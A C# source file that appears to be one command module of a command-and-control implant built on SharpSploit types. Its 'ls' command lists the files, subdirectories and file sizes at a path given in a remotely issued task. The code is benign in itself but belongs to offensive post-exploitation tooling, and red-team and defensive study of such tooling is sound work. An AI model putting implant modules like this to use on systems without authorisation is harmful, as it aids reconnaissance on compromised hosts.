using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using Agent.Models;

namespace Agent.Commands
{
    public class ListDirectory : AgentCommand
    {
        public override string Name => "ls";

        public override string Execute(AgentTask task)
        {
            var results = new SharpSploitResultList<ListDirectoryResult>();
            string path;
            if (task.Args is null || task.Args.Length == 0)
            {
                path = Directory.GetCurrentDirectory();
            }
            else
            {
                path = task.Args[0];
            }
            var files = Directory.GetFiles(path);
            foreach (var file in files)
            {
                var fileinfo = new FileInfo(file);
                results.Add(new ListDirectoryResult
                {
                    Name = fileinfo.FullName,
                    Length =
                    fileinfo.Length
                });
            }
            var directories = Directory.GetDirectories(path);
            foreach (var directory in directories)
            {
                var dirInfo = new DirectoryInfo(directory);
                results.Add(new ListDirectoryResult
                {
                    Name = dirInfo.FullName,
                    Length = 0
                });
            }
            return results.ToString();
        }
    }
    public sealed class ListDirectoryResult : SharpSploitResult
    {
        public string Name { get; set; }
        public long Length { get; set; }

        protected internal override IList<SharpSploitResultProperty> ResultProperties => new List<SharpSploitResultProperty>
        {
            new SharpSploitResultProperty{Name = nameof(Name),Value = Name},
            new SharpSploitResultProperty{Name = nameof(Length),Value = Length}
        };
    }
}
